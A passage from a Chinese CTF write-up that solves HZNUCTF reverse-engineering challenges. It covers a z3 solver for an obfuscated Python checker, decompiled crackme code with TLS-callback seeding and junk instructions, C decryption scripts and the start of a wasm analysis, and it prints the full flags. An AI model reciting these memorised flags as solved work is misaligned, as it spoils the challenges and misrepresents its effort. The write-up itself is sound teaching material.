i11i1Iii1I1[28] + 29 * i11i1Iii1I1[29] == 130106]        if all(ii1iIi1i11i):            print(&quot;Congratulation!!!&quot;)        else:            print(&quot;wrong_wrong!!!&quot;)</code></pre><p>经过混淆的python代码，不过也就换了一些变量名啥的，自行替换一下就可以了</p><p>程序的整体逻辑就是先将输入的flag字符串中的每个字符的出现次数进行统计，然后将每个字符替换成其出现次数的那个数字，这是第一次check。接下来还是统计字符的出现次数，转换成特定排序的字符串，就是按顺序，每个字符后面跟的数字就是这个字符出现的次数，比如输入HZNUCTF{111}，那么就会输出H1Z1N1U1C1T1F1{113}1，最后进行方程式的约束检测</p><p>以下是解题脚本</p><pre><code class="language-python">from z3 import *# 定义变量 enc[0] 到 enc[29]enc = [Int(f&quot;enc_&#123;i&#125;&quot;) for i in range(30)]# 创建求解器solver = Solver()# 定义方程组equations = [    7 * enc[0] == 504,    9 * enc[0] - 5 * enc[1] == 403,    2 * enc[0] - 5 * enc[1] + 10 * enc[2] == 799,    3 * enc[0] + 8 * enc[1] + 15 * enc[2] + 20 * enc[3] == 2938,    5 * enc[0] + 15 * enc[1] + 20 * enc[2] - 19 * enc[3] + 1 * enc[4] == 2042,    7 * enc[0] + 1 * enc[1] + 9 * enc[2] - 11 * enc[3] + 2 * enc[4] + 5 * enc[5] == 1225,    11 * enc[0] + 22 * enc[1] + 33 * enc[2] + 44 * enc[3] + 55 * enc[4] + 66 * enc[5] - 77 * enc[6] == 7975,    21 * enc[0] + 23 * enc[1] + 3 * enc[2] + 24 * enc[3] - 55 * enc[4] + 6 * enc[5] - 7 * enc[6] + 15 * enc[7] == 229,    2 * enc[0] + 26 * enc[1] + 13 * enc[2] + 0 * enc[3] - 65 * enc[4] + 15 * enc[5] + 29 * enc[6] + 1 * enc[7] + 20 *    enc[8] == 2107,    10 * enc[0] + 7 * enc[1] + -9 * enc[2] + 6 * enc[3] + 7 * enc[4] + 1 * enc[5] + 22 * enc[6] + 21 * enc[7] - 22 *    enc[8] + 30 * enc[9] == 4037,    15 * enc[0] + 59 * enc[1] + 56 * enc[2] + 66 * enc[3] + 7 * enc[4] + 1 * enc[5] - 122 * enc[6] + 21 * enc[7] + 32 *    enc[8] + 3 * enc[9] - 10 * enc[10] == 4950,    13 * enc[0] + 66 * enc[1] + 29 * enc[2] + 39 * enc[3] - 33 * enc[4] + 13 * enc[5] - 2 * enc[6] + 42 * enc[7] + 62 *    enc[8] + 1 * enc[9] - 10 * enc[10] + 11 * enc[11] == 12544,    23 * enc[0] + 6 * enc[1] + 29 * enc[2] + 3 * enc[3] - 3 * enc[4] + 63 * enc[5] - 25 * enc[6] + 2 * enc[7] + 32 *    enc[8] + 1 * enc[9] - 10 * enc[10] + 11 * enc[11] - 12 * enc[12] == 6585,    223 * enc[0] + 6 * enc[1] - 29 * enc[2] - 53 * enc[3] - 3 * enc[4] + 3 * enc[5] - 65 * enc[6] + 0 * enc[7] + 36 *    enc[8] + 1 * enc[9] - 15 * enc[10] + 16 * enc[11] - 18 * enc[12] + 13 * enc[13] == 6893,    29 * enc[0] + 13 * enc[1] - 9 * enc[2] - 93 * enc[3] + 33 * enc[4] + 6 * enc[5] + 65 * enc[6] + 1 * enc[7] - 36 *    enc[8] + 0 * enc[9] - 16 * enc[10] + 96 * enc[11] - 68 * enc[12] + 33 * enc[13] - 14 * enc[14] == 1883,    69 * enc[0] + 77 * enc[1] - 93 * enc[2] - 12 * enc[3] + 0 * enc[4] + 0 * enc[5] + 1 * enc[6] + 16 * enc[7] + 36 *    enc[8] + 6 * enc[9] + 19 * enc[10] + 66 * enc[11] - 8 * enc[12] + 38 * enc[13] - 16 * enc[14] + 15 * enc[        15] == 8257,    23 * enc[0] + 2 * enc[1] - 3 * enc[2] - 11 * enc[3] + 12 * enc[4] + 24 * enc[5] + 1 * enc[6] + 6 * enc[7] + 14 *    enc[8] - 0 * enc[9] + 1 * enc[10] + 68 * enc[11] - 18 * enc[12] + 68 * enc[13] - 26 * enc[14] + 15 * enc[15] - 16 *    enc[16] == 5847,    24 * enc[0] + 0 * enc[1] - 1 * enc[2] - 15 * enc[3] + 13 * enc[4] + 4 * enc[5] + 16 * enc[6] + 67 * enc[7] + 146 *    enc[8] - 50 * enc[9] + 16 * enc[10] + 6 * enc[11] - 1 * enc[12] + 69 * enc[13] - 27 * enc[14] + 45 * enc[15] - 6 *    enc[16] + 17 * enc[17] == 18257,    25 * enc[0] + 26 * enc[1] - 89 * enc[2] + 16 * enc[3] + 19 * enc[4] + 44 * enc[5] + 36 * enc[6] + 66 * enc[        7] - 150 * enc[8] - 250 * enc[9] + 166 * enc[10] + 126 * enc[11] - 11 * enc[12] + 690 * enc[13] - 207 * enc[        14] + 46 * enc[15] + 6 * enc[16] + 7 * enc[17] - 18 * enc[18] == 12591,    5 * enc[0] + 26 * enc[1] + 8 * enc[2] + 160 * enc[3] + 9 * enc[4] - 4 * enc[5] + 36 * enc[6] + 6 * enc[7] - 15 *    enc[8] - 20 * enc[9] + 66 * enc[10] + 16 * enc[11] - 1 * enc[12] + 690 * enc[13] - 20 * enc[14] + 46 * enc[15] + 6 *    enc[16] + 7 * enc[17] - 18 * enc[18] + 19 * enc[19] == 52041,    29 * enc[0] - 26 * enc[1] + 0 * enc[2] + 60 * enc[3] + 90 * enc[4] - 4 * enc[5] + 6 * enc[6] + 6 * enc[7] - 16 *    enc[8] - 21 * enc[9] + 69 * enc[10] + 6 * enc[11] - 12 * enc[12] + 69 * enc[13] - 20 * enc[14] - 46 * enc[15] + 65 *    enc[16] + 0 * enc[17] - 1 * enc[18] + 39 * enc[19] - 20 * enc[20] == 20253,    45 * enc[0] - 56 * enc[1] + 10 * enc[2] + 650 * enc[3] - 900 * enc[4] + 44 * enc[5] + 66 * enc[6] - 6 * enc[7] - 6 *    enc[8] - 21 * enc[9] + 9 * enc[10] - 6 * enc[11] - 12 * enc[12] + 69 * enc[13] - 2 * enc[14] - 406 * enc[15] + 651 *    enc[16] + 2 * enc[17] - 10 * enc[18] + 69 * enc[19] - 0 * enc[20] + 21 * enc[21] == 18768,    555 * enc[0] - 6666 * enc[1] + 70 * enc[2] + 510 * enc[3] - 90 * enc[4] + 499 * enc[5] + 66 * enc[6] - 66 * enc[        7] - 610 * enc[8] - 221 * enc[9] + 9 * enc[10] - 23 * enc[11] - 102 * enc[12] + 6 * enc[13] + 2050 * enc[        14] - 406 * enc[15] + 665 * enc[16] + 333 * enc[17] + 100 * enc[18] + 609 * enc[19] + 777 * enc[20] + 201 * enc[        21] - 22 * enc[22] == 111844,    1 * enc[0] - 22 * enc[1] + 333 * enc[2] + 4444 * enc[3] - 5555 * enc[4] + 6666 * enc[5] - 666 * enc[6] + 676 * enc[        7] - 660 * enc[8] - 22 * enc[9] + 9 * enc[10] - 73 * enc[11] - 107 * enc[12] + 6 * enc[13] + 250 * enc[14] - 6 *    enc[15] + 65 * enc[16] + 39 * enc[17] + 10 * enc[18] + 69 * enc[19] + 777 * enc[20] + 201 * enc[21] - 2 * enc[        22] + 23 * enc[23] == 159029,    520 * enc[0] - 222 * enc[1] + 333 * enc[2] + 4 * enc[3] - 56655 * enc[4] + 6666 * enc[5] + 666 * enc[6] + 66 * enc[        7] - 60 * enc[8] - 220 * enc[9] + 99 * enc[10] + 73 * enc[11] + 1007 * enc[12] + 7777 * enc[13] + 2500 * enc[        14] + 6666 * enc[15] + 605 * enc[16] + 390 * enc[17] + 100 * enc[18] + 609 * enc[19] + 99999 * enc[20] + 210 *    enc[21] + 232 * enc[22] + 23 * enc[23] - 24 * enc[24] == 2762025,    1323 * enc[0] - 22 * enc[1] + 333 * enc[2] + 4 * enc[3] - 55 * enc[4] + 666 * enc[5] + 666 * enc[6] + 66 * enc[        7] - 660 * enc[8] - 220 * enc[9] + 99 * enc[10] + 3 * enc[11] + 100 * enc[12] + 777 * enc[13] + 2500 * enc[        14] + 6666 * enc[15] + 605 * enc[16] + 390 * enc[17] + 100 * enc[18] + 609 * enc[19] + 9999 * enc[20] + 210 *    enc[21] + 232 * enc[22] + 23 * enc[23] - 24 * enc[24] + 25 * enc[25] == 1551621,    777 * enc[0] - 22 * enc[1] + 6969 * enc[2] + 4 * enc[3] - 55 * enc[4] + 666 * enc[5] - 6 * enc[6] + 96 * enc[        7] - 60 * enc[8] - 220 * enc[9] + 99 * enc[10] + 3 * enc[11] + 100 * enc[12] + 777 * enc[13] + 250 * enc[        14] + 666 * enc[15] + 65 * enc[16] + 90 * enc[17] + 100 * enc[18] + 609 * enc[19] + 999 * enc[20] + 21 * enc[        21] + 232 * enc[22] + 23 * enc[23] - 24 * enc[24] + 25 * enc[25] - 26 * enc[26] == 948348,    97 * enc[0] - 22 * enc[1] + 6969 * enc[2] + 4 * enc[3] - 56 * enc[4] + 96 * enc[5] - 6 * enc[6] + 96 * enc[7] - 60 *    enc[8] - 20 * enc[9] + 99 * enc[10] + 3 * enc[11] + 10 * enc[12] + 707 * enc[13] + 250 * enc[14] + 666 * enc[        15] + -9 * enc[16] + 90 * enc[17] + -2 * enc[18] + 609 * enc[19] + 0 * enc[20] + 21 * enc[21] + 2 * enc[        22] + 23 * enc[23] - 24 * enc[24] + 25 * enc[25] - 26 * enc[26] + 27 * enc[27] == 777044,    177 * enc[0] - 22 * enc[1] + 699 * enc[2] + 64 * enc[3] - 56 * enc[4] - 96 * enc[5] - 66 * enc[6] + 96 * enc[        7] - 60 * enc[8] - 20 * enc[9] + 99 * enc[10] + 3 * enc[11] + 10 * enc[12] + 707 * enc[13] + 250 * enc[        14] + 666 * enc[15] + -9 * enc[16] + 0 * enc[17] + -2 * enc[18] + 69 * enc[19] + 0 * enc[20] + 21 * enc[        21] + 222 * enc[22] + 23 * enc[23] - 224 * enc[24] + 25 * enc[25] - 26 * enc[26] + 27 * enc[27] - 28 * enc[        28] == 185016,    77 * enc[0] - 2 * enc[1] + 6 * enc[2] + 6 * enc[3] - 96 * enc[4] - 9 * enc[5] - 6 * enc[6] + 96 * enc[7] - 0 * enc[        8] - 20 * enc[9] + 99 * enc[10] + 3 * enc[11] + 10 * enc[12] + 707 * enc[13] + 250 * enc[14] + 666 * enc[        15] + -9 * enc[16] + 0 * enc[17] + -2 * enc[18] + 9 * enc[19] + 0 * enc[20] + 21 * enc[21] + 222 * enc[        22] + 23 * enc[23] - 224 * enc[24] + 26 * enc[25] - -58 * enc[26] + 27 * enc[27] - 2 * enc[28] + 29 * enc[        29] == 130106]# 将所有方程添加到求解器中for eq in equations:    solver.add(eq)# 求解if solver.check() == sat:    model = solver.model()    # 输出解    result = [chr(model[enc[i]].as_long()) for i in range(30)]    for i in range(30):        print(result[i], end=&quot;&quot;)else:    print(&quot;没有解&quot;)</code></pre><p>H1Z1N1U1C1T1F1{1a6d275f7-463}1拿到flag中所含的字符，那么就可以根据111111116257645365477364777645752361进行还原</p><p><strong>HZNUCTF{ad7fa-76a7-ff6a-fffa-7f7d6a}</strong></p><hr><h3 id="randomsystem"><a href="#randomsystem" class="headerlink" title="randomsystem"></a>randomsystem</h3><p>考点总结：自定义加密，伪随机，TLS回调，花指令</p><p>题目描述：名字乱取的…flag格式为HZNUCTF{}</p><p>WP：</p><p>题目附件无壳，直接ida64打开分析</p><pre><code class="language-c">__int64 sub_412370()&#123;  int v0; // edx  int v1; // eax  __int64 v3; // [esp-8h] [ebp-78Ch]  char v4; // [esp+0h] [ebp-784h]  char v5; // [esp+0h] [ebp-784h]  char v6; // [esp+0h] [ebp-784h]  char v7; // [esp+0h] [ebp-784h]  char v8; // [esp+0h] [ebp-784h]  int m; // [esp+250h] [ebp-534h]  int k; // [esp+25Ch] [ebp-528h]  unsigned int v11; // [esp+268h] [ebp-51Ch]  int j; // [esp+274h] [ebp-510h]  char v13; // [esp+283h] [ebp-501h]  int i; // [esp+298h] [ebp-4ECh]  int rand_num[34]; // [esp+2A4h] [ebp-4E0h] BYREF  char Str[20]; // [esp+32Ch] [ebp-458h] BYREF  int enc[66]; // [esp+340h] [ebp-444h] BYREF  _OWORD v18[16]; // [esp+448h] [ebp-33Ch] BYREF  char v19[264]; // [esp+550h] [ebp-234h] BYREF  char Destination[96]; // [esp+658h] [ebp-12Ch] BYREF  char v21; // [esp+6B8h] [ebp-CCh] BYREF  char Source[76]; // [esp+6C0h] [ebp-C4h] BYREF  int v23; // [esp+70Ch] [ebp-78h] BYREF  int v24; // [esp+710h] [ebp-74h]  int v25; // [esp+714h] [ebp-70h]  int v26; // [esp+718h] [ebp-6Ch]  char v27; // [esp+71Ch] [ebp-68h]  int v28[4]; // [esp+728h] [ebp-5Ch] BYREF  char v29[72]; // [esp+738h] [ebp-4Ch] BYREF  int savedregs; // [esp+784h] [ebp+0h] BYREF  sub_41137A(&amp;unk_41E0A9);  v23 = 0;  v24 = 0;  v25 = 0;  v26 = 0;  v27 = 0;  j_memset(v19, 0, 0x100u);  j_memset(v18, 0, sizeof(v18));  strcpy(Str, &quot;KeYkEy!!&quot;);  enc[0] = 376;  enc[1] = 356;  enc[2] = 169;  enc[3] = 501;  enc[4] = 277;  enc[5] = 329;  enc[6] = 139;  enc[7] = 342;  enc[8] = 380;  enc[9] = 365;  enc[10] = 162;  enc[11] = 258;  enc[12] = 381;  enc[13] = 339;  enc[14] = 347;  enc[15] = 307;  enc[16] = 263;  enc[17] = 359;  enc[18] = 162;  enc[19] = 484;  enc[20] = 310;  enc[21] = 333;  enc[22] = 346;  enc[23] = 339;  enc[24] = 150;  enc[25] = 194;  enc[26] = 175;  enc[27] = 344;  enc[28] = 158;  enc[29] = 250;  enc[30] = 128;  enc[31] = 175;  enc[32] = 158;  enc[33] = 173;  enc[34] = 152;  enc[35] = 379;  enc[36] = 158;  enc[37] = 292;  enc[38] = 130;  enc[39] = 365;  enc[40] = 197;  enc[41] = 20;  enc[42] = 197;  enc[43] = 161;  enc[44] = 198;  enc[45] = 10;  enc[46] = 207;  enc[47] = 244;  enc[48] = 202;  enc[49] = 14;  enc[50] = 204;  enc[51] = 176;  enc[52] = 193;  enc[53] = 255;  enc[54] = 35;  enc[55] = 7;  enc[56] = 158;  enc[57] = 181;  enc[58] = 145;  enc[59] = 353;  enc[60] = 153;  enc[61] = 357;  enc[62] = 246;  enc[63] = 151;  printf(&quot;Welcome to HZNUCTF!!!\n&quot;, v4);  printf(&quot;Enter something: \n&quot;, v5);  scanf(&quot;%64s&quot;, (char)v29);  sub_411339(v29, v28);                         // // 将以二进制形式输入的key先转成十六进制  sub_41128F(v28[0], v28[1], &amp;v23);  if ( (char)v23 == 53                          // // 对key的检查    &amp;&amp; SBYTE1(v23) == 50    &amp;&amp; SBYTE2(v23) == 54    &amp;&amp; SHIBYTE(v23) == 53    &amp;&amp; (char)v24 == 53    &amp;&amp; SBYTE1(v24) == 54    &amp;&amp; SBYTE2(v24) == 54    &amp;&amp; SHIBYTE(v24) == 53    &amp;&amp; (char)v25 == 53    &amp;&amp; SBYTE1(v25) == 50    &amp;&amp; SBYTE2(v25) == 54    &amp;&amp; SHIBYTE(v25) == 53    &amp;&amp; (char)v26 == 53    &amp;&amp; SBYTE1(v26) == 51    &amp;&amp; SBYTE2(v26) == 54    &amp;&amp; SHIBYTE(v26) == 53 )  &#123;    printf(&quot;good_job!!!\n&quot;, v6);    printf(&quot;So, Plz input the flag:\n&quot;, v7);    scanf(&quot;%73s&quot;, (char)&amp;v21);    strncpy_s(Destination, 0x41u, Source, 0x40u);    sub_41127B();    srand(Seed);                                // 伪随机初始化，但是这里的seed并不是看到的0，而是经过tls回调函数重新赋值的2025    sub_41127B();    j_memset(rand_num, 0, 0x80u);    for ( i = 0; i &lt; 32; ++i )                  // 伪随机数组    &#123;      do      &#123;        rand();        v1 = sub_41127B() % 32;        v13 = 1;        for ( j = 0; j &lt; i; ++j )        &#123;          if ( rand_num[j] == v1 )          &#123;            v13 = 0;            break;          &#125;        &#125;      &#125;      while ( !v13 );      rand_num[i] = v1;    &#125;    sub_41105F(Destination, rand_num);          // 对flag大括号里的内容进行处理，以生成的伪随机数作为下标进行打乱。但是有花指令    sub_411307(v19, Destination);               // 将打乱后的flag大括号的内容处理为8*8的矩阵    sub_411334(&amp;v23, Str);                      // key的再赋值    sub_4112DA(&amp;dword_41C368, v19, v18);        // 矩阵乘法    v11 = 0;    for ( k = 0; k &lt; 8; ++k )    &#123;      for ( m = 0; m &lt; 8; ++m )      &#123;        *((_DWORD *)&amp;v18[2 * k] + m) ^= Str[v11 % j_strlen(Str)];        ++v11;      &#125;    &#125;    if ( sub_411078(v18, enc) == 1 )      printf(&quot;Congratulation!!!\n&quot;, v8);  &#125;  else  &#123;    printf(&quot;wrong_wrong!!!\n&quot;, v6);  &#125;  sub_41120D(&amp;savedregs, &amp;dword_412D48, 0, v0);  return v3;&#125;</code></pre><p>main函数里的各个函数的逻辑都已注释好，但是有些函数在反编译时需要去花，考查的都是一些常见的花指令</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250301181238957.png" alt="image-20250301181238957"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250301181306358.png" alt="image-20250301181306358"></p><p>sub_41105F函数</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250301181412591.png" alt="image-20250301181412591"></p><p>sub_411334函数</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250301173037500.png" alt="image-20250301173037500"></p><p>sub_4112DA函数</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250301181720994.png" alt="image-20250301181720994"></p><p>sub_411307函数</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250301173312623.png" alt="image-20250301173312623"></p><p>TLS回调函数</p><pre><code class="language-c">__int64 __userpurge TlsCallback_0_0@&lt;edx:eax&gt;(int a1@&lt;eax&gt;, int a2@&lt;edx&gt;, int a3, int a4, int a5)&#123;  __int64 v6; // [esp-8h] [ebp-200h]  int j; // [esp+D0h] [ebp-128h]  int i; // [esp+DCh] [ebp-11Ch]  int v9; // [esp+E8h] [ebp-110h]  int v10[65]; // [esp+F4h] [ebp-104h] BYREF  int savedregs; // [esp+1F8h] [ebp+0h] BYREF  Seed = 2025;  v10[0] = 1;  v10[1] = 1;  v10[2] = 0;  v10[3] = 1;  v10[4] = 0;  v10[5] = 0;  v10[6] = 1;  v10[7] = 0;  v10[8] = 0;  v10[9] = 1;  v10[10] = 1;  v10[11] = 0;  v10[12] = 0;  v10[13] = 1;  v10[14] = 0;  v10[15] = 1;  v10[16] = 0;  v10[17] = 0;  v10[18] = 1;  v10[19] = 1;  v10[20] = 0;  v10[21] = 1;  v10[22] = 1;  memset(&amp;v10[23], 0, 16);  v10[27] = 1;  v10[28] = 0;  v10[29] = 1;  v10[30] = 0;  v10[31] = 1;  v10[32] = 0;  v10[33] = 1;  v10[34] = 0;  v10[35] = 0;  v10[36] = 1;  v10[37] = 0;  v10[38] = 1;  memset(&amp;v10[39], 0, 24);  v10[45] = 1;  v10[46] = 0;  v10[47] = 1;  memset(&amp;v10[48], 0, 24);  v10[54] = 1;  v10[55] = 1;  v10[56] = 0;  v10[57] = 1;  v10[58] = 1;  memset(&amp;v10[59], 0, 16);  v10[63] = 1;  v9 = 0;  for ( i = 0; i &lt; 8; ++i )  &#123;    for ( j = 0; j &lt; 8; ++j )    &#123;      a2 = v10[v9];      dword_41C368[8 * i + j] = a2;      ++v9;    &#125;    a1 = i + 1;  &#125;  sub_41120D(&amp;savedregs, &amp;dword_411B50, a1, a2);  return v6;&#125;</code></pre><p>至于key的由来，注意观察</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250301182215231.png" alt="image-20250301182215231"></p><p>以及sub_411334函数的逻辑，可知key就是<strong>ReVeReSe</strong>，然后将其转为二进制，就是我们最开始输入程序的内容。</p><p>那么就可以写脚本解密了，先解异或，然后再来算矩阵</p><pre><code class="language-c">#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() &#123;int enc[64];    enc[0] = 376;    enc[1] = 356;    enc[2] = 169;    enc[3] = 501;    enc[4] = 277;    enc[5] = 329;    enc[6] = 139;    enc[7] = 342;    enc[8] = 380;    enc[9] = 365;    enc[10] = 162;    enc[11] = 258;    enc[12] = 381;    enc[13] = 339;    enc[14] = 347;    enc[15] = 307;    enc[16] = 263;    enc[17] = 359;    enc[18] = 162;    enc[19] = 484;    enc[20] = 310;    enc[21] = 333;    enc[22] = 346;    enc[23] = 339;    enc[24] = 150;    enc[25] = 194;    enc[26] = 175;    enc[27] = 344;    enc[28] = 158;    enc[29] = 250;    enc[30] = 128;    enc[31] = 175;    enc[32] = 158;    enc[33] = 173;    enc[34] = 152;    enc[35] = 379;    enc[36] = 158;    enc[37] = 292;    enc[38] = 130;    enc[39] = 365;    enc[40] = 197;    enc[41] = 20;    enc[42] = 197;    enc[43] = 161;    enc[44] = 198;    enc[45] = 10;    enc[46] = 207;    enc[47] = 244;    enc[48] = 202;    enc[49] = 14;    enc[50] = 204;    enc[51] = 176;    enc[52] = 193;    enc[53] = 255;    enc[54] = 35;    enc[55] = 7;    enc[56] = 158;    enc[57] = 181;    enc[58] = 145;    enc[59] = 353;    enc[60] = 153;    enc[61] = 357;    enc[62] = 246;    enc[63] = 151;    char key[9] = &quot;ReVeReSe&quot;;        for (int i = 0; i &lt; 64; i++) &#123;        enc[i] ^= key[i % 8];        printf(&quot;%d &quot;, enc[i]);    &#125;    return 0;&#125;</code></pre><blockquote><p>298 257 255 400 327 300 216 307 302 264 244 359 303 310 264 342 341 258 244 385 356 296 265 310 196 167 249 317 204 159 211 202 204 200 206 286 204 321 209 264 151 113 147 196 148 111 156 145 152 107 154 213 147 154 112 98 204 208 199 260 203 256 165 242</p></blockquote><p>然后求与flag填充的矩阵相乘的矩阵的逆矩阵，可以使用在线网站</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250301182503632.png" alt="image-20250301182503632"></p><p>然后将结果和脚本解出的数据进行相乘</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250301183206092.png" alt="image-20250301183206092"></p><p>然后将结果提出来</p><pre><code class="language-c">#include&lt;stdio.h&gt;int main() &#123;   int enc[8][8] = &#123;&#123;102,100,49,49,118,53,54,100&#125;,&#123;52,53,52,114,54,102,52,97&#125;,&#123;99,98,45,49,101,97,56,100&#125;,&#123;45,54,102,121,56,48,55,57&#125;,&#123;53,97,102,56,51,122,102,114&#125;,&#123;98,56,45,99,100,54,99,100&#125;,&#123;99,50,52,116,99,97,55,53&#125;,&#123;53,57,102,97,48,57,57,45&#125;&#125;;   for (int i = 0; i &lt; 8; i++) &#123;for (int j = 0; j &lt; 8; j++) &#123;printf(&quot;%c&quot;, enc[i][j]);&#125;   &#125;&#125;</code></pre><p>运行结果是fd11v56d454r6f4acb-1ea8d-6fy80795af83zfrb8-cd6cdc24tca7559fa099-</p><p>就差最后一步了，还原正确flag的次序</p><p>伪随机的种子是2025，根据伪代码的逻辑，生成32个不重复的伪随机数，并且都小于32，然后进行还原</p><pre><code class="language-c">#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#include &lt;stdbool.h&gt;#include &lt;time.h&gt;#include &lt;windows.h&gt;int main() &#123;int seed = 2025;srand(seed);int rand_num[32] = &#123; 0 &#125;;for (int i = 0; i &lt; 32; i++) &#123;int enc;bool is_unique;do &#123;enc = rand() % 32;is_unique = true;for (int j = 0; j &lt; i; j++) &#123;if (rand_num[j] == enc) &#123;is_unique = false;break;&#125;&#125;&#125; while (!is_unique); // 如果重复，重新生成随机数rand_num[i] = enc; // 将不重复的随机数放入数组&#125;   char enc[] = &quot;fd11v56d454r6f4acb-1ea8d-6fy80795af83zfrb8-cd6cdc24tca7559fa099-&quot;;size_t len = strlen(enc);for (int i = 0; i &lt; len / 2; i++) &#123;char temp = enc[i];enc[i] = enc[len - rand_num[i] - 1];enc[len - rand_num[i] - 1] = temp;&#125;printf(&quot;%s&quot;, enc);   return 0;&#125;</code></pre><p>拿到flag大括号的内容</p><p>3zfb899ac5c256d-7a8r59f0tccd-4fa6b8vfd111-a44ffy4r0-6dce5679da58</p><p>flag就是<strong>HZNUCTF{3zfb899ac5c256d-7a8r59f0tccd-4fa6b8vfd111-a44ffy4r0-6dce5679da58}</strong></p><hr><h3 id="index"><a href="#index" class="headerlink" title="index"></a>index</h3><p>考点总结：wasm，自定义加密，伪随机</p><p>题目描述：名字乱取的…flag格式为HZNUCTF{}</p><p>WP：</p><p>在出这题的时候出题人还不知道<strong>ghidra</strong>装插件之后可以很好的反编译wasm，那么现在有了的话就可以不那么痛苦的去手撕.o了。</p><p>并且这个题在开始的时候还是有些问题的，就是在伪随机数产生的时候，那个RAND_MAX，最开始没管这个数，结果导致我的源码和生成后的wasm中的数不一样，一个是0x7FFF，一个是0x7FFFFFFF，前者是源码中的，后者是附件中的，导致解密出问题。给受到影响的师傅磕一个了orz；同时感谢yuro orz。(下次测题得仔细点)当然，这个题最后还是有些问题，就是动态调试的时候还是有些问题，有些数据不知道被写到哪里去了…(以后不出这种不稳点的题了…)</p><p>插件的网址</p><blockquote><p><a href="https://github.com/nneonneo/ghidra-wasm-plugin/">https://github.com/nneonneo/ghidra-wasm-plugin/</a></p></blockquote><p>安装好之后，修一下wasm文件的文件头，附件中是大写的.ASM，标准的应该是.asm，改一下，就可以直接用ghidra分析了</p><p>反编译完成之后，<strong>unnamed_function_12</strong>就是主函数了，很清晰</p><pre><code class="language-c">undefined4 unnamed_function_12(void)&#123;  int iVar1;  undefined8 *local_80 [4];  undefined8 *local_70;  int local_6c;  int local_68;  int local_64;  byte local_60 [32];  undefined8 local_40;  undefined local_38;  undefined8 local_30;  undefined8 local_28;  undefined8 local_20;  undefined8 local_18;  undefined local_10;  undefined4 local_4;    local_4 = 0;  local_10 = 0;  local_18 = 0;  local_20 = 0;  local_28 = 0;  local_30 = 0;  local_38 = 0;  local_40 = 0;  local_60[0x18] = 0;  local_60[0x19] = 0;  local_60[0x1a] = 0;  local_60[0x1b] = 0;  local_60[0x1c] = 0;  local_60[0x1d] = 0;  local_60[0x1e] = 0;  local_60[0x1f] = 0;  local_60[0x10] = 0;  local_60[0x11] = 0;  local_60[0x12] = 0;  local_60[0x13] = 0;  local_60[0x14] = 0;  local_60[0x15] = 0;  local_60[0x16] = 0;  local_60[0x17] = 0;  local_60[8] = 0;  local_60[9] = 0;  local_60[10] = 0;  local_60[0xb] = 0;  local_60[0xc] = 0;  local_60[0xd] = 0;  local_60[0xe] = 0;  local_60[0xf] = 0;  local_60[0] = 0;  local_60[1] = 0;  local_60[2] = 0;  local_60[3] = 0;  local_60[4] = 0;  local_60[5] = 0;  local_60[6] = 0;  local_60[7] = 0;  unnamed_function_14(s_Welcome_to_HZNUCTF!!!_ram_000100ae,0);  unnamed_function_14(s_Plz_input_the_key:_ram_00010051,0);  local_70 = &amp;local_40;  unnamed_function_17(0x10026,&amp;local_70);  iVar1 = unnamed_function_21(&amp;local_40,0x11020);  if (iVar1 == 0) &#123;    unnamed_function_7(&amp;local_40);    unnamed_function_14(s_Ok,_let&#39;s_go!!!_ram_0001007a,0);    unnamed_function_14(s_Plz_input_the_flag:_ram_00010065,0);    local_80[0] = &amp;local_30;    unnamed_function_17(0x10026,local_80);    iVar1 = unnamed_function_22(&amp;local_30);    if (iVar1 == 0x20) &#123;      unnamed_function_9(&amp;local_30,local_60);      for (local_64 = 0; local_64 &lt; 8; local_64 = local_64 + 1) &#123;        unnamed_function_11(local_60 + local_64 * 4,&amp;local_40);      &#125;      for (local_68 = 0; local_68 &lt; 8; local_68 = local_68 + 1) &#123;        for (local_6c = 0; local_6c &lt; 4; local_6c = local_6c + 1) &#123;          if ((uint)local_60[local_6c + local_68 * 4] !=              *(uint *)(local_68 * 0x10 + 0x10fa0 + local_6c * 4)) &#123;            unnamed_function_14(s_wrong_wrong!!!_ram_00010042,0);            return 0;          &#125;        &#125;      &#125;      unnamed_function_14(s_Congratulation!!!_ram_0001008b,0);    &#125;    else &#123;      unnamed_function_14(s_wrong_wrong!!!_ram_00010042,0);    &#125;  &#125;  else &#123;    unnamed_function_14(s_wrong_wrong!!!_ram_0001009e,0);  &#125;  return 0;&#125;</code></pre><p>整体逻辑就是先输入key，然后判断key是否正确，接着对key进行异或处理，xor0x51， 完了输入flag，检查长度是否是32，接下来就是对flag字符顺序进行打乱，打乱完之后就进行异或处理。</p><p>接下来进行仔细分析</p><p><strong>unnamed_function_21</strong>函数就是cmp，将输入的key进行比较，0x11020就是正确的key的存储地址，双击跳转过去即可拿到正确的key，</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250413111916618.png" alt="image-20250413111916618"></p><p>然后进入<strong>unnamed_function_7</strong>进行key的异或，xor 0x51</p><pre><code class="language-c">void unnamed_function_7(int param1)&#123;  int iVar1;  undefined4 local_c;    iVar1 = unnamed_function_22(param1);  for (local_c = 0; local_c &lt; iVar1; local_c = local_c + 1) &#123;    *(byte *)(param1 + local_c) = *(byte *)(param1 + local_c) ^ 0x51;  &#125;  return;&#125;</code></pre><p>接下来输入flag，然后判断长度，然后进入<strong>unnamed_function_9</strong>函数进行打乱</p><pre><code class="language-c">void unnamed_function_9(int param1,int param2)&#123;  undefined4 local_14;  undefined4 local_10;  undefined4 local_c;    local_c = 0;  unnamed_function_15(0x194);  unnamed_function_8(param1,0x20);  for (local_10 = 0; local_10 &lt; 8; local_10 = local_10 + 1) &#123;    for (local_14 = 0; local_14 &lt; 4; local_14 = local_14 + 1) &#123;      *(undefined *)(param2 + local_10 * 4 + local_14) = *(undefined *)(param1 + local_c);      local_c = 